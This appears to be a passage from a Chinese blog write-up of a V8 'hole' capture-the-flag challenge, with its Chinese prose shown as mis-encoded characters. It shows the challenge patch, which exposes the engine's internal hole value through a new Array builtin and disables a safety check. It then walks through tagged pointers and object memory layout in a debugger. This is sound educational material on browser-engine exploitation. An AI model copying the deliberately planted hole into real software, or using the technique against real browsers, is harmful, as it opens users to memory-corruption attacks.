<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleInstallFunction(isolate_, proto, <span class="string">&quot;hole&quot;</span>, Builtin::kArrayHole, <span class="number">0</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>SimpleInstallFunction</code> ÊØèÊâßË°å‰∏ÄÊ¨°Â∞±ÂÆâË£Ö‰∏Ä‰∏™ API Âà∞ <code>isolate_</code> ‰∏≠ </li>
<li>ËøôÈáåÁõ∏ÂΩì‰∫éÊääÁ¨¶Âè∑ ‚Äúhole‚Äù ÂíåÂáΩÊï∞ <code>Builtin::kArrayHole</code> ÁªëÂÆöÂà∞‰∏ÄËµ∑‰∫Ü</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Âú® patch ‰∏≠Ê≥®Èáä‰∫Ü‰∏Ä‰∏™ <code>CSA_CHECK</code></li>
<li>CodeStubAssemblerÔºåV8 ÁöÑ‰∏Ä‰∏™ÁªÑ‰ª∂ÔºåËØ•ÁªÑ‰ª∂ÂÆö‰πâ‰∫Ü‰∏ÄÁßçÂú® TurboFan ÂêéÁ´ØÊûÑÂª∫ÁöÑÂèØÁßªÊ§çÊ±áÁºñËØ≠Ë®Ä</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayHole)&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">1</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    <span class="keyword">return</span> ReadOnlyRoots(isolate).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>‰∏∫ <code>Array</code> ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™ <code>Hole</code> ÊñπÊ≥ïÔºåËé∑Âèñ <code>Hole</code> ÊñπÊ≥ïÁöÑÂèÇÊï∞<ul>
<li>ÂΩìÂèÇÊï∞‰∏™Êï∞Â§ß‰∫é‚Äú1‚ÄùÊó∂ÔºåËøîÂõû <code>undefined_value</code> Êú™Áü•Á±ªÂûã</li>
<li>ÂΩìÂèÇÊï∞‰∏™Êï∞‰∏çÂ§ß‰∫é‚Äú1‚ÄùÊó∂ÔºåËøîÂõû <code>Type::Oddball()</code> ÂºïÁî®Á±ªÂûã</li>
</ul>
</li>
<li>Built-in FunctionsÔºàBuiltinÔºâ‰Ωú‰∏∫V8ÁöÑÂÜÖÂª∫ÂäüËÉΩÔºåÂÆûÁé∞‰∫ÜÂæàÂ§öÈáçË¶ÅÂäüËÉΩ</li>
<li>Builtin ÊòØÁºñËØëÂ•ΩÁöÑÂÜÖÁΩÆ‰ª£Á†ÅÂùóÔºàchunkÔºâÔºåÂ≠òÂÇ®Âú® <code>snapshot_blob.bin</code> Êñá‰ª∂‰∏≠ÔºåV8 ÂêØÂä®Êó∂‰ª•ÂèçÂ∫èÂàóÂåñÊñπÂºèÂä†ËΩΩÔºåËøêË°åÊó∂ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî® </li>
</ul>
<p>ÁÆÄÂçïÊù•ËØ¥Ôºå<code>Hole</code> ÊñπÊ≥ïÂ∞±ÊòØËøîÂõû‰∏Ä‰∏™ <code>Oddball</code> ÂºïÁî®Ôºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c.hole()))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  hole ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line">object</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
<p>ÂÖàÂ≠¶‰π†ËøôÁØáÊñáÁ´†Ôºå‰∫ÜËß£ V8 ÁöÑÁõ∏ÂÖ≥Áü•ËØÜÂíåÂ∏∏Áî®Âà©Áî®ÊâãÊÆµÔºö</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Âà©Áî® v8Ôºö*CTF 2019 oob-v8 (faraz.faith)</a> </li>
</ul>
<p><strong>Ê†áËÆ∞ÊåáÈíà Tagged Pointer</strong></p>
<p>Tagged Pointer ÊòØ‰∏Ä‰∏™ÊåáÈíàÔºàÂÜÖÂ≠òÂú∞ÂùÄÔºâÔºåÂÆÉÂÖ∑Êúâ‰∏éÂÖ∂ÂÖ≥ËÅîÁöÑÈôÑÂä†Êï∞ÊçÆÔºö</p>
<ul>
<li>Â§ßÂ§öÊï∞‰ΩìÁ≥ªÁªìÊûÑÈÉΩÊòØÂ≠óËäÇÂèØÂØªÂùÄÁöÑÔºàÊúÄÂ∞èÁöÑÂèØÂØªÂùÄÂçïÂÖÉÊòØÂ≠óËäÇÔºâÔºå‰ΩÜÊòØÊüê‰∫õÁ±ªÂûãÁöÑÊï∞ÊçÆÈÄöÂ∏∏‰ºö‰∏éÊï∞ÊçÆÁöÑÂ§ßÂ∞èÂØπÈΩêÔºåËøôÁßçÂ∑ÆÂºÇ‰ΩøÊåáÈíàÁöÑ‰∏Ä‰∫õÊúÄ‰ΩéÊúâÊïà‰ΩçÊú™Ë¢´‰ΩøÁî®ÔºåÂÆÉ‰ª¨ÂèØ‰ª•Áî®‰∫éÊ†áÁ≠æ-ÈÄöÂ∏∏Áî®‰Ωú‰ΩçÂ≠óÊÆµÔºàÊØè‰∏™‰ΩçÊòØ‰∏Ä‰∏™ÂçïÁã¨ÁöÑÊ†áÁ≠æÔºâÔºåÂè™Ë¶Å‰ΩøÁî®ËØ•ÊåáÈíàÁöÑ‰ª£Á†ÅÂú®ËÆøÈóÆÂâçÂ∞ÜËøô‰∫õ‰ΩçÂ±èËîΩÊéâÂç≥ÂèØ</li>
<li>Áõ∏ÂèçÔºåÂú®Êüê‰∫õÊìç‰ΩúÁ≥ªÁªü‰∏≠ÔºåËôöÊãüÂú∞ÂùÄÁöÑÂÆΩÂ∫¶ÊØîÊï¥‰∏™‰ΩìÁ≥ªÁªìÊûÑÁöÑÂÆΩÂ∫¶Á™ÑÔºå‰ªéËÄå‰ΩøÊúÄÈ´òÊúâÊïà‰ΩçÂèØÁî®‰∫éÊ†áÁ≠æÔºàÊ≥®ÊÑèÔºåÊüê‰∫õÂ§ÑÁêÜÂô®ÁâπÂà´Á¶ÅÊ≠¢Âú®Â§ÑÁêÜÂô®Á∫ßÂà´‰ΩøÁî®Ê≠§Á±ªÊ†áËÆ∞ÊåáÈíàÔºåÂ∞§ÂÖ∂ÊòØ x86-64ÔºåËøôË¶ÅÊ±ÇÊìç‰ΩúÁ≥ªÁªü‰ΩøÁî®ËßÑËåÉÂΩ¢ÂºèÁöÑÂú∞ÂùÄÔºå‰∏îÊúÄÈ´òÊúâÊïà‰ΩçÂÖ®‰∏∫0ÊàñÂÖ®‰∏∫1Ôºâ</li>
</ul>
<p><strong>JS ÂØπË±°ÂÜÖÂ≠ò‰ø°ÊÅØÂ∏ÉÂ±Ä</strong></p>
<p>ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® GDB Êù•Êü•ÁúãÂÜÖÂ≠òÂ∏ÉÂ±ÄÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax --shell ./<span class="built_in">exp</span>.js </span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/yhellow/tools/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7f16e408e700</span> (LWP <span class="number">6736</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e388d700</span> (LWP <span class="number">6737</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e308c700</span> (LWP <span class="number">6738</span>)]</span><br><span class="line">V8 version <span class="number">11.0</span><span class="number">.0</span> (candidate)</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊµãËØïÁî® JavaScript ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">properties, elements</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="built_in">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="built_in">this</span>[<span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>] = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> foo) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`key:<span class="subst">$&#123;key&#125;</span>, value:<span class="subst">$&#123;foo[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Â∞ùËØïÂú® GDB ‰∏≠ÊâìÂç∞‰ø°ÊÅØ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;&#125;</span><br><span class="line">undefined</span><br><span class="line">d8&gt; <span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(foo);</span><br><span class="line">DebugPrint: <span class="number">0x1dfe0004d74d</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1dfe0019b715</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x1dfe0004de81</span> &lt;PropertyArray[<span class="number">3</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x1dfe0019b30d</span>: [String] in OldSpace: #property0: <span class="number">0x1dfe0004d8dd</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property0&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">0</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b371</span>: [String] in OldSpace: #property1: <span class="number">0x1dfe0004d945</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property1&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">1</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3b1</span>: [String] in OldSpace: #property2: <span class="number">0x1dfe0004d99d</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property2&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">2</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3f1</span>: [String] in OldSpace: #property3: <span class="number">0x1dfe0004da01</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property3&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">3</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b431</span>: [String] in OldSpace: #property4: <span class="number">0x1dfe0004da71</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property4&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">4</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b471</span>: [String] in OldSpace: #property5: <span class="number">0x1dfe0004daed</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property5&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">5</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b4b1</span>: [String] in OldSpace: #property6: <span class="number">0x1dfe0004db75</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property6&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">6</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b5cd</span>: [String] in OldSpace: #property7: <span class="number">0x1dfe0004dc09</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property7&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">7</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b63d</span>: [String] in OldSpace: #property8: <span class="number">0x1dfe0004dce1</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property8&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">8</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b67d</span>: [String] in OldSpace: #property9: <span class="number">0x1dfe0004dd99</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property9&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">9</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b6bd</span>: [String] in OldSpace: #property10: <span class="number">0x1dfe0004ddc9</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property10&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">10</span>), location: properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x1dfe0019b6fd</span>: [String] in OldSpace: #property11: <span class="number">0x1dfe0004dead</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property11&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">11</span>), location: properties[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0x1dfe0004d781</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element0&quot;</span>&gt;</span><br><span class="line">           <span class="number">1</span>: <span class="number">0x1dfe0004d7e1</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element1&quot;</span>&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x1dfe0004d7f5</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element2&quot;</span>&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x1dfe0004d809</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element3&quot;</span>&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x1dfe0004d81d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element4&quot;</span>&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x1dfe0004d831</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element5&quot;</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x1dfe0004d845</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element6&quot;</span>&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x1dfe0004d859</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element7&quot;</span>&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x1dfe0004d86d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element8&quot;</span>&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x1dfe0004d881</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element9&quot;</span>&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x1dfe0004d895</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element10&quot;</span>&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x1dfe0004d8ad</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element11&quot;</span>&gt;</span><br><span class="line">       <span class="number">12</span><span class="number">-16</span>: <span class="number">0x1dfe00002459</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&quot;element0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;element1&quot;</span>, <span class="number">2</span>: <span class="string">&quot;element2&quot;</span>, <span class="number">3</span>: <span class="string">&quot;element3&quot;</span>, <span class="number">4</span>: <span class="string">&quot;element4&quot;</span>, <span class="number">5</span>: <span class="string">&quot;element5&quot;</span>, <span class="number">6</span>: <span class="string">&quot;element6&quot;</span>, <span class="number">7</span>: <span class="string">&quot;element7&quot;</span>, <span class="number">8</span>: <span class="string">&quot;element8&quot;</span>, <span class="number">9</span>: <span class="string">&quot;element9&quot;</span>, <span class="number">10</span>: <span class="string">&quot;element10&quot;</span>, <span class="number">11</span>: <span class="string">&quot;element11&quot;</span>, property0: <span class="string">&quot;property0&quot;</span>, property1: <span class="string">&quot;property1&quot;</span>, property2: <span class="string">&quot;property2&quot;</span>, property3: <span class="string">&quot;property3&quot;</span>, property4: <span class="string">&quot;property4&quot;</span>, property5: <span class="string">&quot;property5&quot;</span>, property6: <span class="string">&quot;property6&quot;</span>, property7: <span class="string">&quot;property7&quot;</span>, property8: <span class="string">&quot;property8&quot;</span>, property9: <span class="string">&quot;property9&quot;</span>, property10: <span class="string">&quot;property10&quot;</span>, property11: <span class="string">&quot;property11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâìÂç∞ÂØπË±° <code>JS_OBJECT_TYPE</code> ÁöÑ‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>xw <span class="number">0x1dfe0004d74d</span><span class="number">-1</span> <span class="comment">/* JS_OBJECT_TYPE */</span></span><br><span class="line"><span class="number">0x1dfe0004d74c</span>:	<span class="number">0x0019b715</span>	<span class="number">0x0004de81</span>	<span class="number">0x0004d795</span>	<span class="number">0x0004d8dd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Ââç3‰∏™Êï∞ÊçÆÂàÜÂà´‰∏∫ <code>map properties elements</code> ÁöÑÂú∞ÂùÄ‰Ωé4Â≠óËäÇ</li>
<li>Ê≥®ÊÑèÔºö<ul>
<li>V8 ‰ΩøÁî®‰∫ÜÊ†áËÆ∞ÊåáÈíàÔºåÂõ†Ê≠§Âú®ÊâìÂç∞ÂâçÈúÄË¶ÅÂÖàÊääÊåáÈíàËøòÂéü</li>
<li>V8 ‰ΩøÁî®‰∫ÜÊåáÈíàÂéãÁº©ÁöÑÊäÄÊúØÔºå‰ªÖÂú®ÂÜÖÂ≠ò‰∏≠Â≠òÂÇ®ÊåáÈíàÁöÑ‰∏ãÈÉ®32‰ΩçÔºåÂπ∂Â∞ÜÂü∫Êú¨È´ò32‰ΩçÂ≠òÂÇ®Âú®ÁâπÂÆöÂØÑÂ≠òÂô®‰∏≠</li>
</ul>
</li>
</ul>
<p>ÊåáÈíà <code>properties</code> Âíå <code>elements</code> ‰∏é V8 ÁöÑ‰∏§ÁßçÂ±ûÊÄßÊúâÂÖ≥Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Á¨¨‰∏Ä‰∏™ for Âæ™ÁéØÂÆö‰πâ‰∫Ü <code>elements</code> ‰∏™Êï∞ÁªÑÁ¥¢ÂºïÂ±ûÊÄßÔºàArray-indexed PropertiesÔºâ </li>
<li>Á¨¨‰∫å‰∏™ for Âæ™ÁéØÂÆö‰πâ‰∫Ü <code>properties</code> ‰∏™ÂëΩÂêçÂ±ûÊÄßÔºàNamed PropertiesÔºâ </li>
</ul>
<p>V8 ÈÅçÂéÜÊó∂‰∏ÄËà¨‰ºöÂÖàÈÅçÂéÜÂâçËÄÖÔºåÂâçÂêé‰∏§ËÄÖÂú®Â∫ïÂ±ÇÂ≠òÂÇ®Âú®‰∏§‰∏™ÂçïÁã¨ÁöÑÊï∞ÊçÆÁªìÊûÑ‰∏≠ÔºåÂàÜÂà´Áî® <code>elements</code> Âíå <code>properties</code> ‰∏§‰∏™ÊåáÈíàÊåáÂêëÂÆÉ‰ª¨</p>
<p><img src="/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/1669786173114.png" alt="1669786173114"> </p>
<ul>
<li>PSÔºöV8 Êúâ‰∏ÄÁßçÁ≠ñÁï•ÔºåÂ¶ÇÊûúÂëΩÂêçÂ±ûÊÄßÂ∞ë‰∫éÁ≠â‰∫é10‰∏™Êó∂ÔºåÂëΩÂêçÂ±ûÊÄß‰ºöÁõ¥Êé•Â≠òÂÇ®Âà∞ÂØπË±°Êú¨Ë∫´ÔºåËÄåÊó†ÈúÄÂÖàÈÄöËøá properties ÊåáÈíàÊü•ËØ¢ÔºàÁõ¥Êé•Â≠òÂÇ®Âà∞ÂØπË±°Êú¨Ë∫´ÁöÑÂ±ûÊÄßË¢´Áß∞‰∏∫ÂØπË±°ÂÜÖÂ±ûÊÄß In-object PropertiesÔºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004d795</span><span class="number">-1</span> <span class="comment">/* elements */</span></span><br><span class="line"><span class="number">0x1dfe0004d794</span>:	<span class="number">0x00002231</span>	<span class="number">0x00000022</span>	<span class="number">0x0004d781</span>	<span class="number">0x0004d7e1</span></span><br><span class="line"><span class="number">0x1dfe0004d7a4</span>:	<span class="number">0x0004d7f5</span>	<span class="number">0x0004d809</span>	<span class="number">0x0004d81d</span>	<span class="number">0x0004d831</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ªéÁ¨¨3‰∏™ÊåáÈíàÂºÄÂßãÔºåÂ∞±ÊòØÔºö[<code>element0</code>Ôºö<code>element11</code>]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004de81</span><span class="number">-1</span> <span class="comment">/* properties */</span></span><br><span class="line"><span class="number">0x1dfe0004de80</span>:	<span class="number">0x00002d19</span>	<span class="number">0x00000006</span>	<span class="number">0x0004ddc9</span>	<span class="number">0x0004dead</span></span><br><span class="line"><span class="number">0x1dfe0004de90</span>:	<span class="number">0x000023e1</span>	<span class="number">0x00002715</span>	<span class="number">0xd12b3982</span>	<span class="number">0x0000000a</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ªéÁ¨¨3‰∏™ÊåáÈíàÂºÄÂßãÔºåÂ∞±ÊòØÔºö[<code>property10</code>Ôºö<code>property11</code>]ÔºàÂâç10‰∏™ÈÉΩÊòØÂØπË±°ÂÜÖÂ±ûÊÄßÔºâ</li>
</ul>
<p>ÂØπË±°ÁöÑÊò†Â∞Ñ <code>map</code> ÊòØ‰∏ÄÁßçÁâπÊÆäÁöÑÂ±ûÊÄßÔºåÂÖ∂‰∏≠ÂåÖÂê´‰ª•‰∏ã‰ø°ÊÅØÔºö</p>
<ul>
<li>ÂØπË±°ÁöÑÂä®ÊÄÅÁ±ªÂûãÔºåÂç≥ <code>String Uint8Array HeapNumber ...</code></li>
<li>ÂØπË±°ÁöÑÂ§ßÂ∞èÔºà‰ª•Â≠óËäÇ‰∏∫Âçï‰ΩçÔºâ</li>
<li>ÂØπË±°ÁöÑÂ±ûÊÄßÂèäÂÖ∂Â≠òÂÇ®‰ΩçÁΩÆ</li>
<li>Êï∞ÁªÑÂÖÉÁ¥†ÁöÑÁ±ªÂûãÔºå‰æãÂ¶ÇÊú™Ë£ÖÁÆ±ÁöÑÂèåÁ≤æÂ∫¶ÊàñÊ†áËÆ∞ÁöÑÊåáÈíà</li>
<li>ÂØπË±°ÁöÑÂéüÂûã</li>
</ul>
